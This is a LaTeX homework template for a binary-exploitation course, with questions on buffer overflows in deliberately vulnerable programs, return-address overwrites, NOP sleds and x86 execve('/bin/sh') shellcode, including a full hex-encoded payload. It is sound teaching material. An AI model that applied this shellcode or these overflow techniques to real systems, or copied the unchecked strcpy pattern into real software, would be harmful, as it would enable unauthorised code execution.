\documentclass{article}[9pt]

\usepackage{listings}
\usepackage{fullpage}
\usepackage{textcomp}
\usepackage{mdframed}

\lstset{ %
  basicstyle=\ttfamily\small,
  commentstyle=\ttfamily\small\emph,
  upquote=true,
  framerule=1.25pt,
  breaklines=true,
  showstringspaces=false,
  escapeinside={(*@}{@*)},
  belowskip=2em,
  aboveskip=1em,
}


\newenvironment{answerfont}{\fontfamily{qhv}\selectfont}{\par}
\newenvironment{myanswer}{\begin{mdframed}\begin{answerfont}}{\end{answerfont}\end{mdframed}}


%%%%%%%%%%%%%%%%%%%%%%%%%%
% To add an answer, use the myanswer environment command under \item heading,like
%
% \item What is the meaning of life, universe, everything?
% \begin{mysanswer}
%   The answer is 42!
% \end{myanswer}
%
% You can also use macro's in your \myanswer if you want to control the
% formatting. Such as verbatim enviroment or lstlisting environment.
%
% BUT(!) I have to be able to read/grade your resulting pdf to give you credit,
% so make sure your home work is well formatted.
%%%%%%%%%%%%%%%%%%%%%%%%%%%

\title{SI485h: HW 01}
\date{FILL IN THE DUE DATE}
\author{FILL IN YOUR NAME}

\maketitle

\section*{Instructions}


\begin{itemize}
  \item You must submit your homework using this Latex template.

\item This homework is graded out of 140 points. Point values are associated to each question
\end{itemize}

\section*{Questions}


\begin{enumerate}
\item (15 points) Consider the \texttt{gdb} output for function \texttt{foo()} :

\begin{verbatim}
(gdb) ds foo
Dump of assembler code for function foo:
0x0804846d <+0>: push ebp
0x0804846e <+1>: mov ebp,esp
0x08048470 <+3>: sub esp,0x28
0x08048473 <+6>: lea eax,[ebp-0x18]
0x08048476 <+9>: mov DWORD PTR [esp+0x4],eax
0x0804847a <+13>: mov DWORD PTR [esp],0x8048540
0x08048481 <+20>: call 0x8048360 <scanf@plt>
0x08048486 <+25>: lea eax,[ebp-0x18]
0x08048489 <+28>: mov DWORD PTR [esp+0x4],eax
0x0804848d <+32>: mov DWORD PTR [esp],0x8048540
0x08048494 <+39>: call 0x8048330 <printf@plt>
0x08048499 <+44>: leave
0x0804849a <+45>: ret
End of assembler dump.
(gdb) x/s 0x8048540
0x8048540: "%s"
\end{verbatim}

\begin{itemize}
\item At what address, in hexadecimal, could there be a potential buffer overflow vulnerability?

\item Write the equivalent code for \texttt{foo()} in C.

\item Consider executing the program like below
\begin{verbatim}
python -c "print 'A'*x"| ./main
\end{verbatim}
What is the \emph{smallest} value of \texttt{x} that will crash the
program. (\emph{HINT: you do not have to overwrite the return
address to cause the first crash.})
\end{itemize}

\item (15 points) Consider the \texttt{gdb} output for function \texttt{foo()} :

\begin{verbatim}
(gdb) ds foo
Dump of assembler code for function foo:
0x0804844d <+0>: push ebp
0x0804844e <+1>: mov ebp,esp
0x08048450 <+3>: sub esp,0x48
0x08048453 <+6>: mov DWORD PTR [ebp-0xc],0x0
0x0804845a <+13>: mov eax,DWORD PTR [ebp+0x8]
0x0804845d <+16>: mov DWORD PTR [esp+0x4],eax
0x08048461 <+20>: lea eax,[ebp-0x2c]
0x08048464 <+23>: mov DWORD PTR [esp],eax
0x08048467 <+26>: call 0x8048320 <strcpy@plt>
0x0804846c <+31>: jmp 0x804848c <foo+63>
0x0804846e <+33>: lea eax,[ebp-0x2c]
0x08048471 <+36>: mov DWORD PTR [esp+0x8],eax
0x08048475 <+40>: mov eax,DWORD PTR [ebp-0xc]
0x08048478 <+43>: mov DWORD PTR [esp+0x4],eax
0x0804847c <+47>: mov DWORD PTR [esp],0x8048540
0x08048483 <+54>: call 0x8048310 <printf@plt>
0x08048488 <+59>: add DWORD PTR [ebp-0xc],0x1
0x0804848c <+63>: cmp DWORD PTR [ebp-0xc],0x2
0x08048490 <+67>: jle 0x804846e <foo+33>
0x08048492 <+69>: leave
0x08048493 <+70>: ret
End of assembler dump.
(gdb) x/s 0x8048540
0x8048540: "%s"
(gdb) r "Go Navy"
Starting program: /home/user/git/si485-binary-exploits/hw/04/demo/main "Go Navy"
0: Go Navy
1: Go Navy
2: Go Navy
[Inferior 1 (process 3044) exited with code 013]
\end{verbatim}

\begin{itemize}
\item Write the equivalent C code for function \texttt{foo()}.

\item Consider executing this program's \texttt{main()} function, which
calls \texttt{foo()} with the command line argument as the argument to
=foo(), like below:

\begin{verbatim}
./main `python -c "print 'A'*x"`
\end{verbatim}

At what value of \texttt{x} does the functionality of the loop change?

\item Provide a complete command line of the form 
\begin{verbatim}
./main `python -c "---------------------------"`
\end{verbatim}
that will cause the loop to print 4 times. And, \textbf{explain} your answer.
\end{itemize}

\item (15 points) Consider the \texttt{gdb} output for the functions \texttt{foo()} and \texttt{bar()}

\begin{verbatim}
(gdb) ds foo
Dump of assembler code for function foo:
0x08048461 <+0>: push ebp
0x08048462 <+1>: mov ebp,esp
0x08048464 <+3>: sub esp,0x28
0x08048467 <+6>: mov eax,DWORD PTR [ebp+0x8]
0x0804846a <+9>: mov DWORD PTR [esp+0x4],eax
0x0804846e <+13>: lea eax,[ebp-0xc]
0x08048471 <+16>: mov DWORD PTR [esp],eax
0x08048474 <+19>: call 0x8048310 <strcpy@plt>
0x08048479 <+24>: lea eax,[ebp-0xc]
0x0804847c <+27>: mov DWORD PTR [esp],eax
0x0804847f <+30>: call 0x8048320 <puts@plt>
0x08048484 <+35>: leave
0x08048485 <+36>: ret
End of assembler dump.
(gdb) ds bar
Dump of assembler code for function bar:
0x0804844d <+0>: push ebp
0x0804844e <+1>: mov ebp,esp
0x08048450 <+3>: sub esp,0x18
0x08048453 <+6>: mov DWORD PTR [esp],0x8048540
0x0804845a <+13>: call 0x8048320 <puts@plt>
0x0804845f <+18>: leave
0x08048460 <+19>: ret
End of assembler dump.
(gdb) x/s 0x8048540
0x8048540: "Beat Army!"
(gdb) r "Go Navy!"
Starting program: /home/user/git/si485-binary-exploits/hw/04/demo/main "Go Navy!"
Go Navy!
[Inferior 1 (process 3129) exited with code 011]
\end{verbatim}

\begin{itemize}
\item Write the equivalent C source code for \texttt{foo()}.

\item Consider executing this program's \texttt{main()} function, which
calls \texttt{foo()} with the command line argument as the argument to
=foo(), like below:

\begin{verbatim}
./main `python -c "print 'A'*x"`
\end{verbatim}

At what value of \texttt{x} will \texttt{foo()}'s return address be overwritten?

\item Provide a complete command line of the form 
\begin{verbatim}
./main `python -c "---------------------------"`
\end{verbatim}
that will cause \texttt{bar()} to execute by exploiting \texttt{foo()}.
\end{itemize}

\item (10 points) Why does system calls use registers to pass arguments, as oppose
to using the stack? What register is used for the return value of
a system call?

\item (10 points) Consider the following x86 code that is initializing the
arguments for the exec system call being setup for interrupt.

\begin{verbatim}
0x0804806e <+14>: mov eax,0xb
0x08048073 <+19>: lea ebx,[esp+0xc]
0x08048077 <+23>: mov ecx,DWORD PTR [esp]
0x0804807a <+26>: mov edx,0x0
0x0804807f <+31>: int 0x80
\end{verbatim}

Complete the diagram below for how the stack looks just prior to
the \texttt{int 0x80} command.

\begin{verbatim}
.-----------------.
|                 |
|-----------------|
|                 |
|-----------------|
|                 |
|-----------------|
|                 |
|-----------------|
|                 | <- esp
'-----------------'
\end{verbatim}

\item (15 points) Consider the following assembly program written in \texttt{asm} syntax:
\begin{verbatim}
SECTION .text
    global _start

_start:
    mov eax,0x0a797661
    push eax

    mov eax,0x4e206f47
    push eax 

    mov edx,0x8
    mov ecx,esp
    mov ebx,0x1 ;MARK 1

    mov eax,0x4
    int 0x80 

    mov ebx,0 ;MARK 2
    mov eax,1
    int 0x80
\end{verbatim}
\begin{itemize}
\item What is the output of the program? \textbf{Explain}.

\item How does the output of the program change if at \texttt{MARK 1} the 0x1
were changed to 0x2?

\item What system call is being performed at \texttt{MARK 2}?
\end{itemize}

\item (15 points) Consider the copiled and assembled shell code:

\begin{verbatim}
08048080 <_start>:
8048080: 6a 00            push 0x0
8048082: 68 a8 90 04 08   push 0x80490a8
8048087: ba 00 00 00 00   mov edx,0x0
804808c: 89 e1            mov ecx,esp
804808e: bb a8 90 04 08   mov ebx,0x80490a8
8048093: b8 0b 00 00 00   mov eax,0xb
8048098: cd 80            int 0x80
804809a: bb 00 00 00 00   mov ebx,0x0
804809f: b8 01 00 00 00   mov eax,0x1
80480a4: cd 80            int 0x80
\end{verbatim}

\begin{itemize}
\item Complete the stack diagram prior to the first interupt assuming
the string \texttt{"/bin/sh"} is at address 0x80490a8. 

\begin{verbatim}
.-----------------.
|                 |
|-----------------|
|                 |
|-----------------|
|                 | <- esp
'-----------------'
\end{verbatim}

\item If we were to package of the bytes into a string and call it
like so:

\begin{verbatim}
int main(){
  char * code = "\x6a\x00\x68\xa8 (...)";
  ((void(*)(void)) code)();
}
\end{verbatim}

Would this fail or succeed in launching a shell? \textbf{Explain.}

\item If we were to package of the bytes into a string and call it
like so:

\begin{verbatim}
int main(){
  char * code = "\x6a\x00\x68\xa8 (...)";
  char s[1024];
  strcp(s,code);
  ((void(*)(void)) s)();
}
\end{verbatim}

Would this fail or succeed in launching a shell? \textbf{Explain.}
\end{itemize}

\item (15 points) Consider the following shell code:

\begin{verbatim}
08048060 <_start>:
8048060: eb 20            jmp 8048082 <callback>

08048062 <dowork>:
8048062: 5e               pop esi
8048063: 6a 00            push 0x0
8048065: 56               push esi
8048066: ba 00 00 00 00   mov edx,0x0
804806b: 89 e1            mov ecx,esp
804806d: 89 f3            mov ebx,esi
804806f: b8 0b 00 00 00   mov eax,0xb
8048074: cd 80            int 0x80
8048076: bb 00 00 00 00   mov ebx,0x0
804807b: b8 01 00 00 00   mov eax,0x1
8048080: cd 80            int 0x80

08048082 <callback>:
8048082: e8 db ff ff ff   call 8048062 <dowork>
8048087: 2f das
8048088: 62 69 6e         bound ebp,QWORD PTR [ecx+0x6e]
804808b: 2f das
804808c: 73 68            jae 80480f6 <callback+0x74>
\end{verbatim}

\begin{itemize}
\item At the the \texttt{pop esi} instructino at address \texttt{0x8048062}, what
address will be stored in the \texttt{esi} register?

\item Explain how this shell code avoids fixed references?

\item This shell code still hass NULL bytes! Rewrite the \texttt{x86}
such that the portion of the code under \texttt{<dowork>} is NULL free.
\end{itemize}

\item (20 points) Consider the following C source code and dissambly of \texttt{vuln()}

\begin{verbatim}
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void bad(){
  printf("You've been naughty!\n");
}

void good(){
  printf("Go Navy!\n");
}

void vuln(int n, char * str){
  int i = 0;
  char buf[32];
  strcpy(buf,str);
  while( i < n ){
    printf("%d %s\n",i++, buf);
  }
}

int main(int argc, char *argv[]){
  vuln(atoi(argv[1]), argv[2]);
  return 0;
}
\end{verbatim}
\begin{verbatim}
0x080484d5  <+0>: push ebp
0x080484d6  <+1>: mov ebp,esp
0x080484d8  <+3>: sub esp,0x48
0x080484db  <+6>: mov DWORD PTR [ebp-0xc],0x0
0x080484e2 <+13>: mov eax,DWORD PTR [ebp+0xc]
0x080484e5 <+16>: mov DWORD PTR [esp+0x4],eax
0x080484e9 <+20>: lea eax,[ebp-0x2c]
0x080484ec <+23>: mov DWORD PTR [esp],eax
0x080484ef <+26>: call 0x8048360 <strcpy@plt>
0x080484f4 <+31>: jmp 0x8048516 <vuln+65>
0x080484f6 <+33>: mov eax,DWORD PTR [ebp-0xc]
0x080484f9 <+36>: lea edx,[eax+0x1]
0x080484fc <+39>: mov DWORD PTR [ebp-0xc],edx
0x080484ff <+42>: lea edx,[ebp-0x2c]
0x08048502 <+45>: mov DWORD PTR [esp+0x8],edx
0x08048506 <+49>: mov DWORD PTR [esp+0x4],eax
0x0804850a <+53>: mov DWORD PTR [esp],0x804860e
0x08048511 <+60>: call 0x8048350 <printf@plt>
0x08048516 <+65>: mov eax,DWORD PTR [ebp-0xc]
0x08048519 <+68>: cmp eax,DWORD PTR [ebp+0x8]
0x0804851c <+71>: jl 0x80484f6 <vuln+33>
0x0804851e <+73>: leave
0x0804851f <+74>: ret 
\end{verbatim}

And, assume you had the following shell code of the following size
\begin{verbatim}
$ ./hexify.sh shell
\xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\x89\xe1\x89\xf3\xb0\x0b\xcd\x80\x31\xdb\x31\
xc0\xb0\x01\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
$ $(printf `./hexify.sh shell`) | wc –c
37
\end{verbatim}

\begin{itemize}
\item If you were to explot the program using the following method,
how many bytes of padding would you need? \textbf{Explain.}

\begin{verbatim}
                .-------------------------.
                |                         |
                v                         |
./vulnerable 5 <shell-code><padding><address-of-buf>
\end{verbatim}

\item With the right padding, will the above method work? Explain
why or why not.

\item Consider smashing the stack using the following method, how
many bytes of padding would you need in the \emph{first} padding? Explain?

\begin{verbatim}
                                         .--------------------------.
                                         |                          |
                                         |                          V
./vulnerable 5 <--------padding-----><address-of-shelcode><padding><shell code>
\end{verbatim}

\item In some cases, the second padding is needed. Give one example case.
\end{itemize}

\item (10 points) What is a \texttt{nop} sled? Explain why replacing the second padding
with a \texttt{nop}-sled increases the likelihood of the attack?
\begin{verbatim}
                                         .--------------------------.
                                         |                          |
                                         |                          V
./vulnerable 5 <--------padding-----><address-of-shelcode><padding><shell code>
\end{verbatim}
\end{enumerate}
\end{document}
%%% Local Variables:
%%% mode: latex
%%% TeX-master: "hw_01"
%%% End:
